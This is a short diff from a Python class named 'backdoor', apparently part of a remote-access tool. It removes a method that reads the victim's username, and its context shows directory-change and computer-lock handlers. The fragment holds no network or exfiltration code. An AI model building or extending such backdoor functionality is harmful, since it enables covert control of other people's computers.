@@ -58,14 +58,6 @@ class backdoor:
 			return "[+] Directory changed to: " + str(path)
 		except Exception as err:
 			return "[-] Error changing directory: " + str(err)
-	
-	# get the current user
-	def get_current_user(self):
-		try:
-			user = os.environ.get('USERNAME')
-			return "[+] Current user: " + str(user)
-		except Exception as err:
-			return "[-] Couldn't get the username: " + str(err)
 
 	# lock computer
 	def lock_computer(self):
